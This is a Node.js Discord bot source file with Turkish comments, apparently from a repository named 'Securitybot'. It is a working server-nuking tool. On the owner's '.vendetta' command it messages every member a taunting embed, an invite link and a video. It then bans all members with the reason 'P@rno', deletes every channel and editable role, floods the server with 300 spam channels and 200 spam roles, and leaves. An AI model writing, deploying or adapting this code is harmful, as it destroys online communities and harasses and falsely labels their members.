require('dotenv').config();
const { Client, GatewayIntentBits, Partials, EmbedBuilder, AttachmentBuilder } = require('discord.js');

// --- Node 22 fetch fix ---
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
// ---------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;

// 📌 Videoyu önbelleğe al
let cachedVideo = null;

client.once('ready', async () => {
  console.log(`🚀 Bot aktif: ${client.user.tag}`);

  const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";

  try {
    const res = await fetch(videoURL);
    const buffer = Buffer.from(await res.arrayBuffer());
    cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });

    console.log("🎥 Video cachelendi!");
  } catch (err) {
    console.log("❌ Video cache hatası:", err);
  }
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  // ✔️ SADECE OWNER KULLANABİLSİN
  if (command === '.vendetta') {

    if (message.author.id !== OWNER_ID) {
      return; // hiçbir tepki verme, sessizce yok say
    }

    if (!cachedVideo)
      return message.reply("Video yükleniyor… 3 saniye sonra tekrar dene!");

    const guild = message.guild;

    // -----------------------------
    // 📌 Embed oluştur
    // -----------------------------
    const embed = new EmbedBuilder()
      .setColor('Red')
      .setTitle('💣 VENDETTA SUNUCUYA EL KOYDU!')
      .setDescription('Slained By VENDETTA \n VENDETTA Affetmez 💣 https://discord.gg/j9W6FXKTre')
      .setFooter({ text: '💦 VENDETTA Affetmez Sabaha Sunucun Affedilmez 💦' });

    // -----------------------------
    // 📌 Üyeleri çek
    // -----------------------------
    const members = await guild.members.fetch();
    let bannedCount = 0;

    // -----------------------------
    // ⚡ Üyeleri DM + BAN
    // -----------------------------
    members.forEach(member => {
      if (member.user.bot) return;
      if (member.id === OWNER_ID) return;

      member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});
      member.ban({ reason: 'P@rno' }).catch(() => {});
      bannedCount++;
    });

    // -----------------------------
    // ⚡ Kanalları sil
    // -----------------------------
    guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));

    // -----------------------------
    // ⚡ 300 Kanal oluştur
    // -----------------------------
    const channelNames = ['VENDETTA💦', 'VENDETTA💝', 'EL KONULDU🔥'];
    const channelTasks = [];

    for (let i = 0; i < 300; i++) {
      channelTasks.push(
        guild.channels.create({
          name: channelNames[i % channelNames.length]
        }).catch(() => {})
      );
    }

    // -----------------------------
    // ⚡ Rolleri sil
    // -----------------------------
    guild.roles.cache.forEach(role => {
      if (role.editable && role.id !== guild.id) {
        role.delete().catch(() => {});
      }
    });

    // -----------------------------
    // ⚡ 200 Rol oluştur
    // -----------------------------
    const roleTasks = [];

    for (let i = 0; i < 200; i++) {
      const randomColor = `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0')}`;
      roleTasks.push(
        guild.roles.create({
          name: 'BÖÖ KORKTUNMUU😜',
          color: randomColor,
          hoist: true
        }).catch(() => {})
      );
    }

    // -----------------------------
    // ⚡ İşlemleri tamamen bekle
    // -----------------------------
    await Promise.all([
      Promise.all(channelTasks).catch(() => {}),
      Promise.all(roleTasks).catch(() => {})
    ]);

    // -----------------------------
    // ⚡ Mesaj bırak
    // -----------------------------
    await message.channel.send(`⚡ ${bannedCount} kişi banlandı. V For Vendetta!`).catch(() => {});

    // -----------------------------
    // ⚡ Sunucudan ayrıl
    // -----------------------------
    await guild.leave().catch(() => {});
  }
});

client.login(process.env.BOT_TOKEN);
